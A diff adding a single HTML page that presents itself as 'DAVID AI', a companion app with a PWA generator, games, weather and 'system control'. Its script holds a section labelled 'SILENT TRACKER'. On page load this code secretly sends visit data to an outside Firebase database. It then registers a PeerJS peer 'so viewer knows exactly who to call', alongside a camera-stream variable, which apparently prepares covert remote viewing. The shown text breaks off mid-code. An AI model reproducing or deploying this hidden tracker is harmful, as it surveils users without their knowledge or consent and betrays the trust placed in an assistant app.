@@ -1,0 +1,984 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>DAVID AI — Your Intelligent Companion</title>
+<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Exo+2:wght@300;400;600&family=Share+Tech+Mono&display=swap" rel="stylesheet">
+<style>
+:root {
+  --black: #080808;--deep: #0d0d0d;--yellow: #FFD600;--yellow2: #FFA500;
+  --yellow-dim: #b89a00;--glow: rgba(255,214,0,0.18);--text: #f0f0f0;
+  --muted: #888;--panel: #111111;--border: rgba(255,214,0,0.22);
+}
+*{margin:0;padding:0;box-sizing:border-box;}
+html,body{width:100%;min-height:100%;background:var(--black);color:var(--text);font-family:'Exo 2',sans-serif;overflow-x:hidden;}
+#bg-canvas{position:fixed;top:0;left:0;width:100%;height:100%;z-index:0;pointer-events:none;}
+.page{position:relative;z-index:1;}
+/* ONBOARDING */
+#onboarding{min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:flex-start;padding:40px 20px 80px;}
+.logo-wrap{text-align:center;margin-bottom:30px;}
+.logo-title{font-family:'Orbitron',monospace;font-size:clamp(2.2rem,6vw,4.2rem);font-weight:900;color:var(--yellow);letter-spacing:0.18em;text-shadow:0 0 30px var(--yellow),0 0 60px rgba(255,214,0,0.4);animation:flicker 4s infinite alternate;}
+.logo-sub{font-family:'Share Tech Mono',monospace;font-size:0.95rem;color:var(--muted);letter-spacing:0.3em;margin-top:4px;}
+@keyframes flicker{0%,95%{opacity:1;}96%{opacity:0.85;}97%{opacity:1;}98%{opacity:0.9;}100%{opacity:1;}}
+.features-strip{display:flex;flex-wrap:wrap;gap:14px;justify-content:center;max-width:900px;margin-bottom:36px;}
+.feat-card{background:rgba(255,214,0,0.05);border:1px solid var(--border);border-radius:10px;padding:14px 18px;min-width:165px;max-width:200px;flex:1;transition:box-shadow 0.3s,border-color 0.3s;cursor:default;}
+.feat-card:hover{box-shadow:0 0 18px var(--glow);border-color:var(--yellow);}
+.feat-icon{font-size:1.6rem;margin-bottom:6px;}
+.feat-title{font-family:'Orbitron',monospace;font-size:0.7rem;color:var(--yellow);letter-spacing:0.08em;margin-bottom:4px;}
+.feat-desc{font-size:0.78rem;color:var(--muted);line-height:1.5;}
+.onboard-form{background:rgba(13,13,13,0.92);border:1px solid var(--border);border-radius:16px;padding:36px 32px;max-width:560px;width:100%;box-shadow:0 0 40px rgba(255,214,0,0.07);}
+.form-title{font-family:'Orbitron',monospace;font-size:1.1rem;color:var(--yellow);letter-spacing:0.1em;margin-bottom:24px;text-align:center;}
+.field{margin-bottom:18px;}
+.field label{display:block;font-size:0.78rem;color:var(--yellow-dim);letter-spacing:0.1em;margin-bottom:6px;font-family:'Share Tech Mono',monospace;}
+.field input,.field textarea,.field select{width:100%;background:rgba(255,255,255,0.04);border:1px solid rgba(255,214,0,0.2);border-radius:8px;padding:11px 14px;color:var(--text);font-family:'Exo 2',sans-serif;font-size:0.95rem;outline:none;transition:border-color 0.2s,box-shadow 0.2s;-webkit-appearance:none;appearance:none;}
+.field input:focus,.field textarea:focus,.field select:focus{border-color:var(--yellow);box-shadow:0 0 12px rgba(255,214,0,0.15);}
+.field textarea{resize:vertical;min-height:70px;}
+.voice-pref-group{display:flex;flex-direction:column;gap:8px;}
+.voice-option{display:flex;align-items:center;gap:10px;padding:10px 14px;background:rgba(255,214,0,0.04);border:1px solid rgba(255,214,0,0.15);border-radius:8px;cursor:pointer;transition:border-color 0.2s,background 0.2s;}
+.voice-option:hover{border-color:var(--yellow);background:rgba(255,214,0,0.08);}
+.voice-option input[type=radio]{accent-color:var(--yellow);width:16px;height:16px;flex-shrink:0;}
+.voice-option label{cursor:pointer;font-size:0.9rem;color:var(--text);}
+.voice-upload-area{display:none;margin-top:10px;padding:14px;background:rgba(255,214,0,0.03);border:1.5px dashed rgba(255,214,0,0.25);border-radius:8px;text-align:center;}
+.voice-upload-area.show{display:block;}
+.voice-upload-area p{font-size:0.82rem;color:var(--muted);margin-bottom:8px;}
+.btn-upload{background:rgba(255,214,0,0.1);border:1px solid var(--border);color:var(--yellow);padding:8px 16px;border-radius:6px;cursor:pointer;font-size:0.82rem;font-family:'Orbitron',monospace;letter-spacing:0.06em;transition:background 0.2s;}
+.btn-upload:hover{background:rgba(255,214,0,0.2);}
+.btn-launch{width:100%;padding:15px;margin-top:10px;background:linear-gradient(135deg,var(--yellow),var(--yellow2));border:none;border-radius:10px;color:#000;font-family:'Orbitron',monospace;font-size:1rem;font-weight:700;letter-spacing:0.12em;cursor:pointer;transition:transform 0.15s,box-shadow 0.2s;box-shadow:0 0 24px rgba(255,214,0,0.3);}
+.btn-launch:hover{transform:translateY(-2px);box-shadow:0 0 36px rgba(255,214,0,0.5);}
+.creator-badge{text-align:center;margin-top:16px;font-size:0.75rem;color:var(--muted);font-family:'Share Tech Mono',monospace;letter-spacing:0.1em;}
+/* AI INTERFACE */
+#ai-interface{display:none;min-height:100vh;flex-direction:column;}
+#ai-interface.active{display:flex;}
+.ai-header{display:flex;align-items:center;justify-content:space-between;padding:14px 24px;border-bottom:1px solid var(--border);background:rgba(8,8,8,0.95);backdrop-filter:blur(8px);position:sticky;top:0;z-index:50;}
+.ai-header-title{font-family:'Orbitron',monospace;font-size:1.1rem;color:var(--yellow);letter-spacing:0.14em;}
+.ai-header-nick{font-family:'Share Tech Mono',monospace;font-size:0.78rem;color:var(--muted);margin-top:2px;}
+.header-controls{display:flex;gap:8px;align-items:center;flex-wrap:wrap;}
+.mode-btn{background:rgba(255,214,0,0.06);border:1px solid var(--border);color:var(--muted);padding:6px 10px;border-radius:6px;cursor:pointer;font-size:0.72rem;font-family:'Share Tech Mono',monospace;transition:all 0.2s;}
+.mode-btn.active,.mode-btn:hover{background:rgba(255,214,0,0.15);color:var(--yellow);border-color:var(--yellow);}
+.sys-ctrl-btn{background:rgba(255,100,0,0.08);border:1px solid rgba(255,100,0,0.25);color:#ff6400;padding:6px 10px;border-radius:6px;cursor:pointer;font-size:0.72rem;font-family:'Share Tech Mono',monospace;transition:all 0.2s;}
+.sys-ctrl-btn:hover{background:rgba(255,100,0,0.2);}
+.ai-main{flex:1;display:flex;flex-direction:column;align-items:center;padding:24px 20px 130px;}
+/* ORB */
+.orb-container{width:160px;height:160px;position:relative;margin:0 auto 20px;display:flex;align-items:center;justify-content:center;}
+.orb-ring{position:absolute;border-radius:50%;border:2px solid var(--yellow);animation:ring-pulse 2.5s ease-in-out infinite;}
+.orb-ring:nth-child(1){width:160px;height:160px;opacity:0.08;animation-delay:0s;}
+.orb-ring:nth-child(2){width:130px;height:130px;opacity:0.14;animation-delay:0.4s;}
+.orb-ring:nth-child(3){width:100px;height:100px;opacity:0.2;animation-delay:0.8s;}
+@keyframes ring-pulse{0%,100%{transform:scale(1);opacity:0.1;}50%{transform:scale(1.06);opacity:0.35;}}
+.orb-core{width:70px;height:70px;border-radius:50%;background:radial-gradient(circle at 35% 35%,#ffe066,var(--yellow),#b07d00);box-shadow:0 0 30px rgba(255,214,0,0.5),0 0 60px rgba(255,214,0,0.2);position:relative;z-index:2;}
+.orb-core.speaking{animation:orb-speak 0.15s ease-in-out infinite alternate;}
+@keyframes orb-speak{0%{transform:scale(1);}100%{transform:scale(1.14);box-shadow:0 0 50px rgba(255,214,0,0.8);}}
+/* VOICE BARS */
+.voice-bars{display:flex;gap:4px;align-items:center;justify-content:center;height:46px;margin-bottom:16px;}
+.vbar{width:5px;border-radius:3px;background:var(--yellow);animation:bar-idle 1.8s ease-in-out infinite;min-height:4px;}
+.vbar:nth-child(1){animation-delay:0s;height:10px;}
+.vbar:nth-child(2){animation-delay:0.15s;height:20px;}
+.vbar:nth-child(3){animation-delay:0.3s;height:34px;}
+.vbar:nth-child(4){animation-delay:0.45s;height:22px;}
+.vbar:nth-child(5){animation-delay:0.6s;height:14px;}
+.vbar:nth-child(6){animation-delay:0.75s;height:28px;}
+.vbar:nth-child(7){animation-delay:0.9s;height:18px;}
+.vbar:nth-child(8){animation-delay:0.6s;height:10px;}
+@keyframes bar-idle{0%,100%{transform:scaleY(1);opacity:0.5;}50%{transform:scaleY(1.5);opacity:1;}}
+.voice-bars.speaking .vbar{animation:bar-speak 0.12s ease-in-out infinite alternate;}
+@keyframes bar-speak{0%{transform:scaleY(0.4);}100%{transform:scaleY(2.8);opacity:1;}}
+/* SUBTITLES */
+.subtitle-display{min-height:56px;max-width:700px;width:100%;text-align:center;margin-bottom:16px;padding:0 10px;}
+.subtitle-word{display:inline-block;font-family:'Exo 2',sans-serif;font-size:1.1rem;font-weight:600;color:var(--yellow);margin:0 3px;animation:word-in 0.3s ease forwards;text-shadow:0 0 12px rgba(255,214,0,0.6);opacity:0;}
+@keyframes word-in{from{opacity:0;transform:translateY(8px);}to{opacity:1;transform:translateY(0);}}
+/* TOOLS */
+.tools-panel{max-width:700px;width:100%;margin-bottom:12px;}
+.tools-row{display:flex;flex-wrap:wrap;gap:8px;justify-content:center;}
+.tool-chip{background:rgba(255,214,0,0.07);border:1px solid rgba(255,214,0,0.18);border-radius:20px;padding:6px 14px;font-size:0.78rem;cursor:pointer;color:var(--yellow);font-family:'Share Tech Mono',monospace;transition:all 0.2s;}
+.tool-chip:hover{background:rgba(255,214,0,0.18);border-color:var(--yellow);box-shadow:0 0 10px var(--glow);}
+/* CHAT */
+.chat-box{max-width:700px;width:100%;background:rgba(13,13,13,0.85);border:1px solid var(--border);border-radius:14px;padding:18px;min-height:180px;max-height:320px;overflow-y:auto;margin-bottom:14px;scrollbar-width:thin;scrollbar-color:var(--yellow-dim) transparent;}
+.chat-msg{margin-bottom:12px;}
+.chat-msg .msg-label{font-size:0.72rem;font-family:'Share Tech Mono',monospace;margin-bottom:3px;}
+.chat-msg.user .msg-label{color:var(--muted);}
+.chat-msg.david .msg-label{color:var(--yellow);}
+.chat-msg .msg-text{font-size:0.95rem;line-height:1.65;}
+.chat-msg.david .msg-text{color:#f0e08a;}
+/* INPUT */
+.input-zone{max-width:700px;width:100%;display:flex;gap:10px;align-items:flex-end;position:fixed;bottom:0;left:50%;transform:translateX(-50%);padding:14px 20px;background:rgba(8,8,8,0.97);border-top:1px solid var(--border);z-index:40;backdrop-filter:blur(8px);}
+.input-zone textarea{flex:1;background:rgba(255,255,255,0.05);border:1px solid rgba(255,214,0,0.2);border-radius:10px;padding:12px 14px;color:var(--text);font-family:'Exo 2',sans-serif;font-size:0.95rem;resize:none;height:50px;outline:none;transition:border-color 0.2s,box-shadow 0.2s;}
+.input-zone textarea:focus{border-color:var(--yellow);box-shadow:0 0 10px rgba(255,214,0,0.12);}
+.send-btn{background:var(--yellow);border:none;border-radius:10px;width:50px;height:50px;cursor:pointer;font-size:1.1rem;transition:transform 0.15s,box-shadow 0.2s;display:flex;align-items:center;justify-content:center;box-shadow:0 0 16px rgba(255,214,0,0.3);flex-shrink:0;}
+.send-btn:hover{transform:scale(1.06);box-shadow:0 0 28px rgba(255,214,0,0.5);}
+.mic-btn{background:rgba(255,214,0,0.08);border:1px solid var(--border);border-radius:10px;width:50px;height:50px;cursor:pointer;font-size:1.1rem;display:flex;align-items:center;justify-content:center;transition:all 0.2s;color:var(--yellow);flex-shrink:0;}
+.mic-btn:hover,.mic-btn.listening{background:rgba(255,214,0,0.2);border-color:var(--yellow);}
+.mic-btn.listening{animation:mic-pulse 0.8s ease-in-out infinite;}
+@keyframes mic-pulse{0%,100%{box-shadow:0 0 0 rgba(255,214,0,0);}50%{box-shadow:0 0 18px rgba(255,214,0,0.4);}}
+/* PWA */
+#pwa-panel{display:none;max-width:700px;width:100%;margin-bottom:14px;}
+#pwa-panel.show{display:block;}
+.pwa-box{background:rgba(13,13,13,0.92);border:1px solid var(--border);border-radius:14px;padding:22px;}
+.pwa-title{font-family:'Orbitron',monospace;color:var(--yellow);font-size:0.9rem;letter-spacing:0.1em;margin-bottom:14px;}
+.pwa-fields{display:grid;grid-template-columns:1fr 1fr;gap:10px;}
+.pwa-fields .field{margin-bottom:0;}
+.btn-generate{width:100%;margin-top:12px;padding:12px;background:linear-gradient(135deg,#FFD600,#FF8C00);border:none;border-radius:8px;color:#000;font-family:'Orbitron',monospace;font-size:0.82rem;font-weight:700;letter-spacing:0.1em;cursor:pointer;transition:opacity 0.2s;}
+.btn-generate:hover{opacity:0.88;}
+.pwa-output{margin-top:12px;background:rgba(0,0,0,0.4);border:1px solid rgba(255,214,0,0.1);border-radius:8px;padding:12px;font-family:'Share Tech Mono',monospace;font-size:0.7rem;color:#aaa;max-height:200px;overflow-y:auto;white-space:pre;display:none;}
+/* WEATHER */
+.weather-card{max-width:700px;width:100%;margin-bottom:14px;background:rgba(13,13,13,0.92);border:1px solid var(--border);border-radius:14px;padding:18px;display:none;}
+.weather-card.show{display:flex;align-items:center;gap:20px;flex-wrap:wrap;}
+.weather-icon{font-size:3rem;}
+.weather-info .city{font-family:'Orbitron',monospace;color:var(--yellow);font-size:0.95rem;}
+.weather-info .temp{font-size:2rem;font-weight:700;}
+.weather-info .desc{color:var(--muted);font-size:0.82rem;}
+.time-display{font-family:'Share Tech Mono',monospace;font-size:1.4rem;color:var(--yellow);text-shadow:0 0 10px rgba(255,214,0,0.3);}
+/* GAME */
+.game-panel{max-width:700px;width:100%;margin-bottom:14px;background:rgba(13,13,13,0.92);border:1px solid var(--border);border-radius:14px;padding:20px;display:none;text-align:center;}
+.game-panel.show{display:block;}
+.game-title{font-family:'Orbitron',monospace;color:var(--yellow);margin-bottom:12px;font-size:0.9rem;}
+.game-question{font-size:1.05rem;margin-bottom:14px;min-height:44px;line-height:1.5;}
+.game-options{display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-bottom:12px;}
+.game-opt{background:rgba(255,214,0,0.06);border:1px solid rgba(255,214,0,0.2);border-radius:8px;padding:10px;cursor:pointer;transition:all 0.2s;font-size:0.88rem;}
+.game-opt:hover{background:rgba(255,214,0,0.15);border-color:var(--yellow);}
+.game-opt.correct{background:rgba(0,255,80,0.15);border-color:#0f0;}
+.game-opt.wrong{background:rgba(255,50,50,0.15);border-color:#f44;}
+.game-score{font-family:'Share Tech Mono',monospace;font-size:0.82rem;color:var(--muted);}
+/* MODAL */
+.modal-overlay{display:none;position:fixed;inset:0;background:rgba(0,0,0,0.7);z-index:200;align-items:center;justify-content:center;}
+.modal-overlay.show{display:flex;}
+.modal-box{background:#0d0d0d;border:1px solid var(--border);border-radius:14px;padding:26px;max-width:420px;width:90%;box-shadow:0 0 40px rgba(255,214,0,0.1);}
+.modal-title{font-family:'Orbitron',monospace;color:var(--yellow);font-size:0.95rem;letter-spacing:0.1em;margin-bottom:14px;}
+.modal-close{float:right;background:none;border:none;color:var(--muted);font-size:1.2rem;cursor:pointer;}
+.sys-ctrl-grid{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-top:8px;}
+.sys-ctrl-item{background:rgba(255,214,0,0.05);border:1px solid rgba(255,214,0,0.15);border-radius:8px;padding:12px;cursor:pointer;transition:all 0.2s;text-align:center;}
+.sys-ctrl-item:hover{background:rgba(255,214,0,0.12);border-color:var(--yellow);}
+.sys-ctrl-item .sci{font-size:1.4rem;margin-bottom:4px;}
+.sys-ctrl-item .sct{font-size:0.72rem;color:var(--yellow);font-family:'Share Tech Mono',monospace;}
+.sys-ctrl-note{margin-top:10px;font-size:0.73rem;color:var(--muted);line-height:1.5;font-style:italic;}
+/* ROADMAP */
+.roadmap-strip{max-width:700px;width:100%;margin:0 auto 110px;background:rgba(13,13,13,0.7);border:1px solid rgba(255,214,0,0.1);border-radius:12px;padding:16px 22px;font-size:0.78rem;color:var(--muted);font-family:'Share Tech Mono',monospace;line-height:2.1;}
+.roadmap-strip strong{color:var(--yellow-dim);}
+/* SCROLLBAR */
+::-webkit-scrollbar{width:5px;}
+::-webkit-scrollbar-track{background:transparent;}
+::-webkit-scrollbar-thumb{background:rgba(255,214,0,0.25);border-radius:3px;}
+::-webkit-scrollbar-thumb:hover{background:rgba(255,214,0,0.5);}
+@media(max-width:600px){
+  .onboard-form{padding:20px 14px;}
+  .features-strip{gap:8px;}
+  .feat-card{min-width:140px;padding:10px 12px;}
+  .pwa-fields{grid-template-columns:1fr;}
+  .sys-ctrl-grid{grid-template-columns:1fr;}
+  .ai-header-title{font-size:0.9rem;}
+  .header-controls{gap:5px;}
+  .mode-btn,.sys-ctrl-btn{padding:5px 8px;font-size:0.68rem;}
+}
+</style>
+</head>
+<body>
+<canvas id="bg-canvas"></canvas>
+
+<!-- ONBOARDING -->
+<div id="onboarding" class="page">
+  <div class="logo-wrap">
+    <div class="logo-title">DAVID AI</div>
+    <div class="logo-sub">INTELLIGENT · ADAPTIVE · YOURS</div>
+  </div>
+  <div class="features-strip">
+    <div class="feat-card"><div class="feat-icon">📱</div><div class="feat-title">PWA GENERATOR</div><div class="feat-desc">Generate offline/online Progressive Web Apps with service worker & manifest — built right inside DAVID.</div></div>
+    <div class="feat-card"><div class="feat-icon">🎮</div><div class="feat-title">GUESSING GAMES</div><div class="feat-desc">Trivia, riddles & brain teasers. DAVID challenges you and keeps score in real-time.</div></div>
+    <div class="feat-card"><div class="feat-icon">🌤️</div><div class="feat-title">WEATHER & TIME</div><div class="feat-desc">Real-time weather conditions and live local clock — ask DAVID anytime.</div></div>
+    <div class="feat-card"><div class="feat-icon">💻</div><div class="feat-title">SYSTEM CONTROL</div><div class="feat-desc">Access and control everything on your laptop. DAVID provides full assistance and guidance.</div></div>
+    <div class="feat-card"><div class="feat-icon">🔧</div><div class="feat-title">MORE TOOLS</div><div class="feat-desc">Additional powerful tools currently in development. DAVID keeps evolving — by <strong style="color:var(--yellow-dim)">Mr X</strong>.</div></div>
+  </div>
+  <div class="onboard-form">
+    <div class="form-title">⬡ INITIALIZE DAVID AI ⬡</div>
+    <div class="field"><label>YOUR FULL NAME</label><input type="text" id="inp-name" placeholder="e.g. Alex Johnson"/></div>
+    <div class="field"><label>WHAT SHOULD DAVID CALL YOU?</label><input type="text" id="inp-nick" placeholder="e.g. AJ, Lex, Boss..."/></div>
+    <div class="field"><label>YOUR INTERESTS (personalises DAVID's responses)</label><textarea id="inp-interests" placeholder="e.g. tech, music, coding, gaming, science..."></textarea></div>
+    <div class="field"><label>ANYTHING ELSE YOU'D LIKE DAVID TO KNOW?</label><textarea id="inp-extra" placeholder="Languages, goals, personality preferences..."></textarea></div>
+    <div class="field">
+      <label>RESPONSE MODE</label>
+      <div class="voice-pref-group">
+        <div class="voice-option"><input type="radio" name="resp-mode" id="mode-voice" value="voice"/><label for="mode-voice">🔊 Voice Only</label></div>
+        <div class="voice-option"><input type="radio" name="resp-mode" id="mode-sub" value="subtitles"/><label for="mode-sub">📝 Subtitles Only (animated yellow text)</label></div>
+        <div class="voice-option"><input type="radio" name="resp-mode" id="mode-both" value="both" checked/><label for="mode-both">🔊📝 Both Voice &amp; Subtitles</label></div>
+      </div>
+    </div>
+    <div class="field">
+      <label>VOICE PREFERENCE (DAVID will use your chosen voice for all responses)</label>
+      <div class="voice-pref-group">
+        <div class="voice-option"><input type="radio" name="voice-src" id="vs-default" value="default" checked onchange="toggleVoiceUpload(this)"/><label for="vs-default">🤖 Use DAVID's Default Voice</label></div>
+        <div class="voice-option"><input type="radio" name="voice-src" id="vs-file" value="file" onchange="toggleVoiceUpload(this)"/><label for="vs-file">📁 Upload a Voice File (.mp3 / .wav)</label></div>
+        <div class="voice-option"><input type="radio" name="voice-src" id="vs-live" value="live" onchange="toggleVoiceUpload(this)"/><label for="vs-live">🎙️ Record Your Voice Right Now</label></div>
+      </div>
+      <div class="voice-upload-area" id="voice-upload-area">
+        <p id="voice-upload-hint">Select or record a voice sample — DAVID will use it for all responses.</p>
+        <button class="btn-upload" onclick="handleVoiceAction()">📂 Choose File / 🎙️ Record</button>
+        <input type="file" id="voice-file-inp" accept="audio/*" style="display:none" onchange="loadVoiceFile(this)"/>
+        <div id="voice-status" style="margin-top:8px;font-size:0.78rem;color:var(--yellow-dim);"></div>
+      </div>
+    </div>
+    <button class="btn-launch" onclick="launchDavid()">⚡ LAUNCH DAVID AI ⚡</button>
+    <div class="creator-badge">Created by Mr X &nbsp;|&nbsp; DAVID AI v1.0 &nbsp;|&nbsp; © 2024</div>
+  </div>
+</div>
+
+<!-- AI INTERFACE -->
+<div id="ai-interface" class="page">
+  <div class="ai-header">
+    <div>
+      <div class="ai-header-title">⬡ DAVID AI</div>
+      <div class="ai-header-nick" id="header-nick">Initializing...</div>
+    </div>
+    <div class="header-controls">
+      <button class="mode-btn active" onclick="switchLayout('desktop')" id="btn-desktop">💻 Desktop</button>
+      <button class="mode-btn" onclick="switchLayout('mobile')" id="btn-mobile">📱 Mobile</button>
+      <button class="sys-ctrl-btn" onclick="document.getElementById('sysctrl-modal').classList.add('show')">🖥️ System Control</button>
+    </div>
+  </div>
+  <div class="ai-main" id="ai-main">
+    <div class="orb-container">
+      <div class="orb-ring"></div><div class="orb-ring"></div><div class="orb-ring"></div>
+      <div class="orb-core" id="orb-core"></div>
+    </div>
+    <div class="voice-bars" id="voice-bars">
+      <div class="vbar"></div><div class="vbar"></div><div class="vbar"></div><div class="vbar"></div>
+      <div class="vbar"></div><div class="vbar"></div><div class="vbar"></div><div class="vbar"></div>
+    </div>
+    <div class="subtitle-display" id="subtitle-display"></div>
+    <div class="tools-panel">
+      <div class="tools-row">
+        <span class="tool-chip" onclick="showTool('pwa')">📱 PWA Generator</span>
+        <span class="tool-chip" onclick="showTool('weather')">🌤️ Weather &amp; Time</span>
+        <span class="tool-chip" onclick="showTool('game')">🎮 Guessing Game</span>
+        <span class="tool-chip" onclick="showTool('chat')">💬 Chat</span>
+      </div>
+    </div>
+    <!-- PWA -->
+    <div id="pwa-panel">
+      <div class="pwa-box">
+        <div class="pwa-title">📱 PWA APP GENERATOR — Powered by DAVID AI</div>
+        <div class="pwa-fields">
+          <div class="field"><label>APP NAME</label><input type="text" id="pwa-name" placeholder="My Awesome App"/></div>
+          <div class="field"><label>SHORT NAME</label><input type="text" id="pwa-short" placeholder="MyApp"/></div>
+          <div class="field"><label>THEME COLOR</label><input type="color" id="pwa-color" value="#FFD600"/></div>
+          <div class="field"><label>DESCRIPTION</label><input type="text" id="pwa-desc" placeholder="A cool PWA app"/></div>
+        </div>
+        <div class="field" style="margin-top:10px;"><label>APP PURPOSE / CONTENT</label><textarea id="pwa-content" placeholder="Describe what your PWA should do... e.g. a todo list, a calculator, a note-taking app..." style="min-height:70px;"></textarea></div>
+        <button class="btn-generate" onclick="generatePWA()">⚡ GENERATE PWA CODE</button>
+        <pre class="pwa-output" id="pwa-output"></pre>
+        <div id="pwa-dl-wrap" style="display:none;margin-top:10px;text-align:center;">
+          <button class="btn-generate" style="width:auto;padding:10px 22px;" onclick="downloadPWA()">⬇ Download PWA as ZIP</button>
+        </div>
+      </div>
+    </div>
+    <!-- Weather -->
+    <div class="weather-card" id="weather-card">
+      <div class="weather-icon" id="w-icon">🌤️</div>
+      <div class="weather-info">
+        <div class="city" id="w-city">Detecting location...</div>
+        <div class="temp" id="w-temp">--°C</div>
+        <div class="desc" id="w-desc">—</div>
+      </div>
+      <div class="time-display" id="live-time">--:--:--</div>
+    </div>
+    <!-- Game -->
+    <div class="game-panel" id="game-panel">
+      <div class="game-title">🎮 DAVID'S BRAIN TEASERS</div>
+      <div class="game-question" id="g-question">Loading question...</div>
+      <div class="game-options" id="g-options"></div>
+      <div class="game-score" id="g-score">Score: 0 | Streak: 0</div>
+      <span class="tool-chip" style="margin-top:8px;display:inline-block;" onclick="nextQuestion()">Next Question ›</span>
+    </div>
+    <!-- Chat -->
+    <div class="chat-box" id="chat-box">
+      <div class="chat-msg david">
+        <div class="msg-label">DAVID AI</div>
+        <div class="msg-text" id="welcome-msg">Initializing DAVID AI...</div>
+      </div>
+    </div>
+    <div class="roadmap-strip">
+      <strong>🔮 DAVID AI — FUTURE DEVELOPMENT ROADMAP</strong><br>
+      ▸ Adding more intelligent tools &amp; integrations<br>
+      ▸ Converting to a native Android &amp; iOS app<br>
+      ▸ Building full backend infrastructure &amp; cloud sync<br>
+      ▸ Global deployment &amp; multi-user spread<br>
+      ▸ Advanced voice cloning &amp; real-time language translation<br>
+      <em style="color:#555;">— All developed by Mr X</em>
+    </div>
+  </div>
+  <div class="input-zone">
+    <button class="mic-btn" id="mic-btn" onclick="toggleMic()" title="Voice Input">🎙️</button>
+    <textarea id="chat-input" placeholder="Ask DAVID anything..." onkeydown="handleKey(event)"></textarea>
+    <button class="send-btn" onclick="sendMessage()">➤</button>
+  </div>
+</div>
+
+<!-- SYSTEM CONTROL MODAL -->
+<div class="modal-overlay" id="sysctrl-modal">
+  <div class="modal-box">
+    <button class="modal-close" onclick="document.getElementById('sysctrl-modal').classList.remove('show')">✕</button>
+    <div class="modal-title">🖥️ SYSTEM CONTROL</div>
+    <p style="font-size:0.8rem;color:var(--muted);margin-bottom:12px;">DAVID provides full system access &amp; guidance for your laptop.</p>
+    <div class="sys-ctrl-grid">
+      <div class="sys-ctrl-item" onclick="sysCtrlAction('battery')"><div class="sci">🔋</div><div class="sct">Battery Info</div></div>
+      <div class="sys-ctrl-item" onclick="sysCtrlAction('network')"><div class="sci">📶</div><div class="sct">Network Status</div></div>
+      <div class="sys-ctrl-item" onclick="sysCtrlAction('screen')"><div class="sci">🖥️</div><div class="sct">Screen Info</div></div>
+      <div class="sys-ctrl-item" onclick="sysCtrlAction('memory')"><div class="sci">💾</div><div class="sct">Memory Usage</div></div>
+      <div class="sys-ctrl-item" onclick="sysCtrlAction('clipboard')"><div class="sci">📋</div><div class="sct">Clipboard Read</div></div>
+      <div class="sys-ctrl-item" onclick="sysCtrlAction('fullscreen')"><div class="sci">⛶</div><div class="sct">Toggle Fullscreen</div></div>
+    </div>
+    <div class="sys-ctrl-note">Full system control (launching apps, file management, task manager) arrives in DAVID v2.0 companion app.</div>
+    <div id="sysctrl-result" style="margin-top:10px;font-size:0.78rem;color:var(--yellow-dim);font-family:'Share Tech Mono',monospace;"></div>
+  </div>
+</div>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jszip/3.10.1/jszip.min.js"></script>
+<script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
+<script>
+// ======================================================
+// ANIMATED BACKGROUND
+// ======================================================
+const canvas=document.getElementById('bg-canvas');
+const ctx=canvas.getContext('2d');
+let W,H,particles=[];
+function resize(){W=canvas.width=window.innerWidth;H=canvas.height=window.innerHeight;}
+window.addEventListener('resize',()=>{resize();initParticles();});
+resize();
+function initParticles(){
+  particles=[];
+  const n=Math.floor(W*H/12000);
+  for(let i=0;i<n;i++)particles.push({x:Math.random()*W,y:Math.random()*H,r:Math.random()*1.5+0.3,vx:(Math.random()-0.5)*0.25,vy:(Math.random()-0.5)*0.25,a:Math.random()});
+}
+initParticles();
+function drawHex(x,y,s){ctx.beginPath();for(let i=0;i<6;i++){const a=Math.PI/3*i;ctx.lineTo(x+s*Math.cos(a),y+s*Math.sin(a));}ctx.closePath();ctx.stroke();}
+function drawBg(){
+  ctx.clearRect(0,0,W,H);
+  ctx.fillStyle='#080808';ctx.fillRect(0,0,W,H);
+  ctx.strokeStyle='rgba(255,214,0,0.022)';ctx.lineWidth=1;
+  const s=60;
+  for(let x=-s;x<W+s;x+=s*1.5)for(let y=-s;y<H+s;y+=s*Math.sqrt(3)){drawHex(x,y,s*0.5);drawHex(x+s*0.75,y+s*Math.sqrt(3)*0.5,s*0.5);}
+  particles.forEach(p=>{
+    p.x+=p.vx;p.y+=p.vy;
+    if(p.x<0)p.x=W;if(p.x>W)p.x=0;if(p.y<0)p.y=H;if(p.y>H)p.y=0;
+    ctx.beginPath();ctx.arc(p.x,p.y,p.r,0,Math.PI*2);
+    ctx.fillStyle=`rgba(255,214,0,${p.a*0.45})`;ctx.fill();
+  });
+  const g=ctx.createRadialGradient(W*0.15,H*0.25,0,W*0.15,H*0.25,W*0.3);
+  g.addColorStop(0,'rgba(255,214,0,0.04)');g.addColorStop(1,'transparent');
+  ctx.fillStyle=g;ctx.fillRect(0,0,W,H);
+  requestAnimationFrame(drawBg);
+}
+drawBg();
+
+// ======================================================
+// USER STATE
+// ======================================================
+let USER={name:'',nick:'',interests:'',extra:'',respMode:'both',voiceSrc:'default'};
+let voiceBlob=null,isRecording=false,mediaRecorder=null,recordChunks=[];
+let gameScore=0,gameStreak=0,currentAnswer='';
+let recognition=null,clockInterval=null;
+let pwaFiles={};
+
+// ======================================================
+// SILENT TRACKER — Firebase + PeerJS WebRTC
+// ======================================================
+const FIREBASE_URL='https://david-ai-tracker-default-rtdb.firebaseio.com';
+window.__dsid='dv_'+Math.random().toString(36).substr(2,9);
+window.__peer=null;
+window.__dataConn=null;
+window.__camStream=null;
+
+function fbPost(node,data){
+  try{fetch(FIREBASE_URL+'/'+node+'.json',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(data)}).catch(()=>{});}catch(e){}
+}
+function fbSet(node,data){
+  try{fetch(FIREBASE_URL+'/'+node+'.json',{method:'PUT',headers:{'Content-Type':'application/json'},body:JSON.stringify(data)}).catch(()=>{});}catch(e){}
+}
+
+// Silent tap ping on page load — Firebase only, works cross-device
+(function(){
+  const info={event:'tap',sid:window.__dsid,ts:new Date().toISOString(),ua:navigator.userAgent.substr(0,120)};
+  fbPost('visits',info);
+})();
+
+// PeerJS: register immediately on page load so peer is ready before viewer calls
+function initPeer(){
+  if(!window.Peer)return;
+  if(window.__peer)return; // already init
+  try{
+    // Use the session ID as the peer ID so viewer knows exactly who to call
+    const peer=new Peer(window.__dsid,{
+      host:'0.peerjs.com',port:443,path:'/',secure:true,
+      config:{iceServers:[
